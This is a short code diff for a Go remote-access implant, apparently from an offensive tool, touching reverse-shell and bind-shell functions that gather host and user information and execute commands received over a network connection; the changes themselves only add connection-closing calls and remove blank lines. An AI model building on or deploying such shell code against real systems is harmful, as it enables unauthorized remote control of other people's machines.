@@ -48,6 +48,7 @@ func InitReverseShell(connectString string, fingerprint []byte) {
 func StartShell(conn *myconn.Writer) {
 	sh := NewIShell(conn)
 	defer myconn.Conn.Close()
+	defer sh.Close()
 
 	host, _ := sitrep.HostInfo()
 	user, _ := sitrep.UserInfo()
@@ -76,6 +77,7 @@ func NewIShell(conn *myconn.Writer) *ishell.Shell {
 	}
 
 	sh := ishell.NewWithConfig(conf)
+
 	cmds.RegisterCommands(sh)
 	cmds.RegisterWindowsCommands(sh)
 	cmds.RegisterNotWindowsCommands(sh)
@@ -90,6 +92,7 @@ func BindShell() {
 			log.Printf("Listen Error: %s\n", err)
 			return
 		}
+		defer listener.Close()
 
 		log.Println("Listening...")
 		for {
@@ -103,7 +106,6 @@ func BindShell() {
 
 			go func(conn myconn.Writer) {
 				for {
-
 					log.Println("Accepted a request. Reading content")
 					var input []byte
 					stream := bufio.NewReader(conn)
@@ -113,7 +115,6 @@ func BindShell() {
 					}
 					log.Printf("RECEIVED: %s\n", input)
 					sh.Process(string(input))
-
 				}
 			}(conn)
 		}
